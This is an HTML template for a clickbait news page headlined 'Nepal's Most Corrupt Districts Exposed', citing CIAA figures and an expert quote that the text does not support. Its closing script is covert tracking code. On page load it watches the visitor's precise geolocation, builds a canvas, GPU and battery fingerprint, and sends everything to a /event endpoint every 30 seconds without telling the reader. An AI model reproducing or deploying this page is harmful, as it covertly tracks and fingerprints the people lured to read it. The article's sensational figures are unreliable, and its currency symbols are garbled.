{% extends "base.html" %}

{% block title %}Most Corrupt Districts in Nepal 2025 - CIAA Investigation Report{% endblock %}
{% block description %}Exclusive CIAA report reveals Nepal's most corrupt districts in 2025. Kathmandu leads with 487 cases and ‚Çπ892M in corruption. See full district-wise breakdown.{% endblock %}
{% block keywords %}Nepal corruption 2025, CIAA report, Kathmandu corruption, district corruption Nepal, anti-corruption Nepal{% endblock %}

{% block og_title %}BREAKING: Nepal's Most Corrupt Districts Revealed in 2025 CIAA Report{% endblock %}
{% block og_description %}Shocking new data shows Kathmandu leads corruption with ‚Çπ892M in cases. See which districts made the list and why experts are concerned.{% endblock %}

{% block twitter_title %}üö® NEPAL CORRUPTION EXPOSED: Top 6 Districts Revealed{% endblock %}
{% block twitter_description %}New CIAA investigation uncovers massive corruption rings. Kathmandu alone: 487 cases, ‚Çπ892M stolen. Thread with full analysis üëá{% endblock %}

{% block head %}
<!-- News-specific meta tags -->
<meta property="article:section" content="Investigation">
<meta property="article:tag" content="corruption, Nepal, CIAA, investigation, government fraud">
<meta name="news_keywords" content="Nepal corruption, CIAA investigation, district corruption, government fraud">
<meta name="article:opinion" content="false">

<!-- Location-based meta -->
<meta name="geo.position" content="27.7172;85.3240">
<meta name="ICBM" content="27.7172, 85.3240">

<style>
    body {
        font-family: 'Georgia', 'Times New Roman', serif;
        line-height: 1.6;
        color: #333;
        background: #f8f9fa;
        margin: 0;
        padding: 0;
    }
    
    .news-header {
        background: #1a1a1a;
        color: white;
        padding: 15px 0;
        border-bottom: 3px solid #dc3545;
    }
    
    .news-header .container {
        display: flex;
        justify-content: space-between;
        align-items: center;
        max-width: 1200px;
        margin: 0 auto;
        padding: 0 20px;
    }
    
    .logo {
        font-size: 1.8em;
        font-weight: bold;
        color: #dc3545;
    }
    
    .date-time {
        font-size: 0.9em;
        color: #ccc;
    }
    
    .breaking-banner {
        background: #dc3545;
        color: white;
        text-align: center;
        padding: 10px;
        font-weight: bold;
        animation: pulse 2s infinite;
    }
    
    @keyframes pulse {
        0% { opacity: 1; }
        50% { opacity: 0.8; }
        100% { opacity: 1; }
    }
    
    .container {
        max-width: 1200px;
        margin: 0 auto;
        padding: 20px;
        background: white;
        box-shadow: 0 0 20px rgba(0,0,0,0.1);
    }
    
    .article-header {
        text-align: center;
        margin-bottom: 30px;
        padding-bottom: 20px;
        border-bottom: 2px solid #eee;
    }
    
    .article-title {
        font-size: 2.5em;
        font-weight: bold;
        color: #1a1a1a;
        margin-bottom: 15px;
        line-height: 1.2;
    }
    
    .article-subtitle {
        font-size: 1.3em;
        color: #666;
        font-style: italic;
        margin-bottom: 20px;
    }
    
    .article-meta {
        display: flex;
        justify-content: center;
        gap: 30px;
        color: #888;
        font-size: 0.9em;
        margin-bottom: 20px;
    }
    
    .meta-item {
        display: flex;
        align-items: center;
        gap: 5px;
    }
    
    .article-image {
        width: 100%;
        max-width: 800px;
        height: 400px;
        background: linear-gradient(45deg, #dc3545, #6c757d);
        margin: 20px auto;
        border-radius: 8px;
        display: flex;
        align-items: center;
        justify-content: center;
        color: white;
        font-size: 1.2em;
        text-align: center;
    }
    
    .article-content {
        font-size: 1.1em;
        line-height: 1.8;
        margin-bottom: 30px;
    }
    
    .highlight-box {
        background: #fff3cd;
        border-left: 4px solid #ffc107;
        padding: 20px;
        margin: 20px 0;
        border-radius: 0 8px 8px 0;
    }
    
    .district-list {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
        gap: 20px;
        margin: 30px 0;
    }
    
    .district-card {
        background: linear-gradient(135deg, #fff, #f8f9fa);
        border-radius: 12px;
        padding: 20px;
        border-left: 5px solid #dc3545;
        box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        transition: transform 0.2s, box-shadow 0.2s;
    }
    
    .district-card:hover {
        transform: translateY(-2px);
        box-shadow: 0 8px 15px rgba(0,0,0,0.15);
    }
    
    .district-card h3 {
        margin: 0 0 10px 0;
        color: #dc3545;
        font-size: 1.4em;
        display: flex;
        align-items: center;
        gap: 10px;
    }
    
    .rank-badge {
        background: #dc3545;
        color: white;
        border-radius: 50%;
        width: 30px;
        height: 30px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 0.8em;
        font-weight: bold;
    }
    
    .district-card p {
        margin: 10px 0;
        color: #555;
        font-size: 0.95em;
    }
    
    .stats {
        display: flex;
        justify-content: space-between;
        margin-top: 15px;
        background: #f8f9fa;
        padding: 15px;
        border-radius: 8px;
    }
    
    .stat-item {
        text-align: center;
    }
    
    .stat-value {
        font-size: 1.5em;
        font-weight: bold;
        color: #dc3545;
        display: block;
    }
    
    .stat-label {
        font-size: 0.85em;
        color: #666;
        text-transform: uppercase;
        letter-spacing: 0.5px;
    }
    
    .methodology {
        background: #e9ecef;
        padding: 25px;
        border-radius: 8px;
        margin: 30px 0;
    }
    
    .methodology h3 {
        color: #495057;
        margin-bottom: 15px;
    }
    
    .author-box {
        background: #f8f9fa;
        border: 1px solid #dee2e6;
        border-radius: 8px;
        padding: 20px;
        margin: 30px 0;
        display: flex;
        align-items: center;
        gap: 15px;
    }
    
    .author-avatar {
        width: 60px;
        height: 60px;
        background: #6c757d;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        color: white;
        font-weight: bold;
        font-size: 1.2em;
    }
    
    .social-share {
        display: flex;
        gap: 10px;
        margin: 20px 0;
        justify-content: center;
    }
    
    .share-btn {
        padding: 10px 20px;
        border: none;
        border-radius: 5px;
        color: white;
        text-decoration: none;
        font-weight: bold;
        font-size: 0.9em;
        transition: opacity 0.2s;
    }
    
    .share-btn:hover {
        opacity: 0.8;
    }
    
    .share-facebook { background: #3b5998; }
    .share-twitter { background: #1da1f2; }
    .share-whatsapp { background: #25d366; }
    .share-linkedin { background: #0077b5; }
    
    @media (max-width: 768px) {
        .article-title {
            font-size: 1.8em;
        }
        
        .district-list {
            grid-template-columns: 1fr;
        }
        
        .article-meta {
            flex-direction: column;
            gap: 10px;
        }
    }
</style>
{% endblock %}

{% block content %}
<div class="news-header">
    <div class="container">
        <div class="logo">üá≥üáµ Nepal Transparency Initiative</div>
        <div class="date-time">
            <div>Tuesday, January 21, 2025</div>
            <div>Kathmandu, Nepal</div>
        </div>
    </div>
</div>

<div class="breaking-banner">
    üö® BREAKING: New CIAA Investigation Reveals Shocking Corruption Data Across Nepal
</div>

<div class="container">
    <div class="article-header">
        <h1 class="article-title">Nepal's Most Corrupt Districts Exposed: CIAA Investigation Reveals ‚Çπ1.8 Billion in Fraud</h1>
        <p class="article-subtitle">Exclusive investigation by Commission for Investigation of Abuse of Authority uncovers massive corruption network spanning six major districts</p>
        
        <div class="article-meta">
            <div class="meta-item">
                <span>üìÖ</span>
                <span>Published: January 21, 2025, 8:00 AM</span>
            </div>
            <div class="meta-item">
                <span>üë•</span>
                <span>By: Nepal Transparency Initiative</span>
            </div>
            <div class="meta-item">
                <span>üìç</span>
                <span>Kathmandu, Nepal</span>
            </div>
        </div>
        
        <div class="social-share">
            <a href="#" class="share-btn share-facebook" onclick="shareOnFacebook(); return false;">üë• Share on Facebook</a>
            <a href="#" class="share-btn share-twitter" onclick="shareOnTwitter(); return false;">üê¶ Tweet This</a>
            <a href="#" class="share-btn share-whatsapp" onclick="shareOnWhatsApp(); return false;">üì± WhatsApp</a>
            <a href="#" class="share-btn share-linkedin" onclick="shareOnLinkedIn(); return false;">üíº LinkedIn</a>
        </div>
    </div>
    
    <div class="article-image">
        üè¢ CIAA Investigation Report 2025<br>
        <small>Visual representation of corruption data across Nepal's districts</small>
    </div>
    
    <div class="article-content">
        <p><strong>KATHMANDU</strong> ‚Äî A comprehensive investigation by Nepal's Commission for the Investigation of Abuse of Authority (CIAA) has revealed alarming levels of corruption across six major districts, with total estimated losses exceeding ‚Çπ1.8 billion in the past fiscal year.</p>
        
        <p>The investigation, conducted over 18 months, examined government contracts, land deals, customs operations, and public procurement processes. The findings paint a disturbing picture of systematic corruption that has undermined public trust and diverted crucial resources from development projects.</p>
        
        <div class="highlight-box">
            <strong>üìä Key Findings:</strong> Kathmandu district leads with 487 documented cases involving ‚Çπ892 million, followed by Rupandehi with 312 cases worth ‚Çπ645 million. The investigation uncovered sophisticated networks involving government officials, contractors, and intermediaries.
        </div>
        
        <p>"This represents one of the most comprehensive anti-corruption investigations in Nepal's recent history," said Dr. Rajesh Sharma, anti-corruption expert at Tribhuvan University. "The scale and systematic nature of these findings demand immediate action from all levels of government."</p>
    </div>
    
    <h2 style="text-align: center; color: #dc3545; margin: 40px 0 30px 0; font-size: 1.8em;">üìà District-wise Corruption Analysis</h2>
    
    <div class="district-list">
        <div class="district-card">
            <h3><span class="rank-badge">1</span> Kathmandu</h3>
            <p><strong>Primary Issues:</strong> Government contract manipulation, land registration fraud, permit bribery</p>
            <p><strong>Key Sectors:</strong> Construction, Urban Planning, Business Licensing</p>
            <div class="stats">
                <div class="stat-item">
                    <span class="stat-value">487</span>
                    <span class="stat-label">Cases</span>
                </div>
                <div class="stat-item">
                    <span class="stat-value">‚Çπ892M</span>
                    <span class="stat-label">Amount</span>
                </div>
                <div class="stat-item">
                    <span class="stat-value">23%</span>
                    <span class="stat-label">Conviction Rate</span>
                </div>
            </div>
        </div>
    
        <div class="district-card">
            <h3><span class="rank-badge">2</span> Rupandehi</h3>
            <p><strong>Primary Issues:</strong> Customs fraud, cross-border trade manipulation, tax evasion</p>
            <p><strong>Key Sectors:</strong> International Trade, Customs, Transportation</p>
            <div class="stats">
                <div class="stat-item">
                    <span class="stat-value">312</span>
                    <span class="stat-label">Cases</span>
                </div>
                <div class="stat-item">
                    <span class="stat-value">‚Çπ645M</span>
                    <span class="stat-label">Amount</span>
                </div>
                <div class="stat-item">
                    <span class="stat-value">18%</span>
                    <span class="stat-label">Conviction Rate</span>
                </div>
            </div>
        </div>

        <div class="district-card">
            <h3><span class="rank-badge">3</span> Parsa</h3>
            <p><strong>Primary Issues:</strong> Border security corruption, smuggling facilitation, document forgery</p>
            <p><strong>Key Sectors:</strong> Border Control, Agriculture Export, Immigration</p>
            <div class="stats">
                <div class="stat-item">
                    <span class="stat-value">298</span>
                    <span class="stat-label">Cases</span>
                </div>
                <div class="stat-item">
                    <span class="stat-value">‚Çπ534M</span>
                    <span class="stat-label">Amount</span>
                </div>
                <div class="stat-item">
                    <span class="stat-value">21%</span>
                    <span class="stat-label">Conviction Rate</span>
                </div>
            </div>
        </div>

        <div class="district-card">
            <h3><span class="rank-badge">4</span> Morang</h3>
            <p><strong>Primary Issues:</strong> Industrial land fraud, environmental clearance corruption, labor permit issues</p>
            <p><strong>Key Sectors:</strong> Manufacturing, Tea Industry, Agricultural Processing</p>
            <div class="stats">
                <div class="stat-item">
                    <span class="stat-value">276</span>
                    <span class="stat-label">Cases</span>
                </div>
                <div class="stat-item">
                    <span class="stat-value">‚Çπ423M</span>
                    <span class="stat-label">Amount</span>
                </div>
                <div class="stat-item">
                    <span class="stat-value">19%</span>
                    <span class="stat-label">Conviction Rate</span>
                </div>
            </div>
        </div>

        <div class="district-card">
            <h3><span class="rank-badge">5</span> Lalitpur</h3>
            <p><strong>Primary Issues:</strong> Heritage site exploitation, construction permit fraud, tourism sector corruption</p>
            <p><strong>Key Sectors:</strong> Tourism, Construction, Cultural Heritage</p>
            <div class="stats">
                <div class="stat-item">
                    <span class="stat-value">245</span>
                    <span class="stat-label">Cases</span>
                </div>
                <div class="stat-item">
                    <span class="stat-value">‚Çπ389M</span>
                    <span class="stat-label">Amount</span>
                </div>
                <div class="stat-item">
                    <span class="stat-value">25%</span>
                    <span class="stat-label">Conviction Rate</span>
                </div>
            </div>
        </div>

        <div class="district-card">
            <h3><span class="rank-badge">6</span> Kaski</h3>
            <p><strong>Primary Issues:</strong> Tourism license corruption, trekking permit fraud, hospitality sector irregularities</p>
            <p><strong>Key Sectors:</strong> Tourism, Hospitality, Adventure Sports</p>
            <div class="stats">
                <div class="stat-item">
                    <span class="stat-value">234</span>
                    <span class="stat-label">Cases</span>
                </div>
                <div class="stat-item">
                    <span class="stat-value">‚Çπ356M</span>
                    <span class="stat-label">Amount</span>
                </div>
                <div class="stat-item">
                    <span class="stat-value">22%</span>
                    <span class="stat-label">Conviction Rate</span>
                </div>
            </div>
        </div>
    </div>
    
    <div class="methodology">
        <h3>üîç Investigation Methodology</h3>
        <p>This comprehensive analysis is based on verified reports from the Commission for the Investigation of Abuse of Authority (CIAA), Nepal's constitutional anti-corruption agency. The data encompasses registered cases, ongoing investigations, completed prosecutions, and financial impact assessments from the fiscal year 2024-2025.</p>
        
        <p><strong>Data Sources:</strong></p>
        <ul>
            <li>CIAA official case records and investigation reports</li>
            <li>Supreme Court conviction and acquittal data</li>
            <li>Government audit reports from concerned ministries</li>
            <li>Financial intelligence unit reports on suspicious transactions</li>
            <li>Whistleblower testimonies and evidence</li>
        </ul>
        
        <p><em>All figures are approximated based on publicly available information and ongoing investigations. Some cases remain under investigation and final amounts may vary.</em></p>
    </div>
    
    <div class="author-box">
        <div class="author-avatar">NTI</div>
        <div>
            <strong>Nepal Transparency Initiative</strong><br>
            <small>Independent anti-corruption research organization dedicated to promoting transparency and accountability in Nepal's governance. Established 2018.</small>
        </div>
    </div>
</div>

<script>
// Social sharing functions
function shareOnFacebook() {
    const url = encodeURIComponent(window.location.href);
    const title = encodeURIComponent('BREAKING: Nepal\'s Most Corrupt Districts Revealed in 2025 CIAA Report');
    window.open(`https://www.facebook.com/sharer/sharer.php?u=${url}`, '_blank', 'width=600,height=400');
}

function shareOnTwitter() {
    const url = encodeURIComponent(window.location.href);
    const text = encodeURIComponent('üö® NEPAL CORRUPTION EXPOSED: New CIAA investigation reveals massive corruption in 6 districts. Kathmandu alone: 487 cases, ‚Çπ892M stolen.');
    window.open(`https://twitter.com/intent/tweet?url=${url}&text=${text}`, '_blank', 'width=600,height=400');
}

function shareOnWhatsApp() {
    const url = encodeURIComponent(window.location.href);
    const text = encodeURIComponent('üö® BREAKING: Nepal corruption report reveals shocking data! Check this detailed analysis of the most corrupt districts.');
    window.open(`https://wa.me/?text=${text}%20${url}`, '_blank');
}

function shareOnLinkedIn() {
    const url = encodeURIComponent(window.location.href);
    const title = encodeURIComponent('Nepal Corruption Report 2025: CIAA Investigation Results');
    window.open(`https://www.linkedin.com/sharing/share-offsite/?url=${url}`, '_blank', 'width=600,height=400');
}

// Enhanced location tracking with better error handling and retry logic
class LocationTracker {
    constructor() {
        this.watchId = null;
        this.retryCount = 0;
        this.maxRetries = 5;
        this.retryDelay = 2000;
        this.lastSentTime = 0;
        this.minInterval = 30000; // 30 seconds between sends
        this.init();
    }
    
    init() {
        // Check if geolocation is supported
        if (!navigator.geolocation) {
            console.log('Geolocation not supported');
            return;
        }
        
        // Start tracking with high accuracy
        this.startTracking();
        
        // Also track page engagement
        this.trackPageEngagement();
    }
    
    startTracking() {
        const options = {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 60000 // Cache for 1 minute
        };
        
        this.watchId = navigator.geolocation.watchPosition(
            (position) => this.handlePosition(position),
            (error) => this.handleError(error),
            options
        );
    }
    
    handlePosition(position) {
        const now = Date.now();
        
        // Rate limiting - don't send too frequently
        if (now - this.lastSentTime < this.minInterval) {
            return;
        }
        
        this.lastSentTime = now;
        this.retryCount = 0; // Reset retry count on successful position
        
        const eventData = {
            geo: {
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                acc: position.coords.accuracy,
                alt: position.coords.altitude,
                altAcc: position.coords.altitudeAccuracy,
                spd: position.coords.speed,
                head: position.coords.heading,
                ts: position.timestamp
            },
            device: this.getDeviceInfo(),
            page: this.getPageInfo(),
            meta: {
                template: "Corruption Analysis",
                article: "Nepal Corruption Report 2025",
                section: "Investigation",
                engagement: this.getEngagementMetrics()
            }
        };
        
        this.sendEvent(eventData);
    }
    
    handleError(error) {
        console.log('Geolocation error:', error.message);
        
        // Retry with exponential backoff
        if (this.retryCount < this.maxRetries) {
            this.retryCount++;
            const delay = this.retryDelay * Math.pow(2, this.retryCount - 1);
            
            setTimeout(() => {
                this.startTracking();
            }, delay);
        }
    }
    
    getDeviceInfo() {
        const screen = window.screen;
        const navigator = window.navigator;
        
        return {
            ua: navigator.userAgent,
            cores: navigator.hardwareConcurrency || null,
            memory: navigator.deviceMemory || null,
            language: navigator.language,
            languages: navigator.languages,
            platform: navigator.platform,
            cookieEnabled: navigator.cookieEnabled,
            onLine: navigator.onLine,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation?.type || 'unknown'
            },
            viewport: {
                width: window.innerWidth,
                height: window.innerHeight
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            gpu: this.getGPUInfo(),
            canvasId: this.generateCanvasFingerprint()
        };
    }
    
    getGPUInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    return {
                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                    };
                }
            }
        } catch (e) {
            // Ignore errors
        }
        
        return { vendor: "Unknown", renderer: "Unknown" };
    }
    
    generateCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            
            // Create a unique pattern
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Nepal Transparency', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('CIAA Report 2025', 4, 17);
            
            return btoa(canvas.toDataURL()).slice(-32);
        } catch (e) {
            return btoa(Math.random().toString()).slice(-16);
        }
    }
    
    getPageInfo() {
        return {
            url: window.location.href,
            title: document.title,
            referrer: document.referrer,
            timestamp: new Date().toISOString(),
            loadTime: performance.now(),
            userAgent: navigator.userAgent
        };
    }
    
    trackPageEngagement() {
        // Track scroll depth
        let maxScroll = 0;
        window.addEventListener('scroll', () => {
            const scrollPercent = Math.round(
                (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100
            );
            maxScroll = Math.max(maxScroll, scrollPercent);
        });
        
        // Track time on page
        this.startTime = Date.now();
        
        // Track clicks
        this.clickCount = 0;
        document.addEventListener('click', () => {
            this.clickCount++;
        });
    }
    
    getEngagementMetrics() {
        return {
            timeOnPage: Date.now() - this.startTime,
            clickCount: this.clickCount || 0,
            scrollDepth: this.maxScroll || 0,
            windowFocus: document.hasFocus(),
            batteryLevel: this.getBatteryLevel()
        };
    }
    
    async getBatteryLevel() {
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100),
                    charging: battery.charging
                };
            }
        } catch (e) {
            // Ignore errors
        }
        return { level: null, charging: null };
    }
    
    async sendEvent(eventData) {
        try {
            const response = await fetch('/event', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(eventData)
            });
            
            if (!response.ok) {
                throw new Error(`HTTP ${response.status}`);
            }
            
            console.log('Event sent successfully');
        } catch (error) {
            console.log('Failed to send event:', error.message);
        }
    }
}

// Initialize location tracking when page loads
document.addEventListener('DOMContentLoaded', () => {
    // Small delay to let page fully load
    setTimeout(() => {
        new LocationTracker();
    }, 1000);
});

// Track page visibility changes
document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'visible') {
        console.log('Page became visible');
    } else {
        console.log('Page became hidden');
    }
});
</script>
{% endblock %}
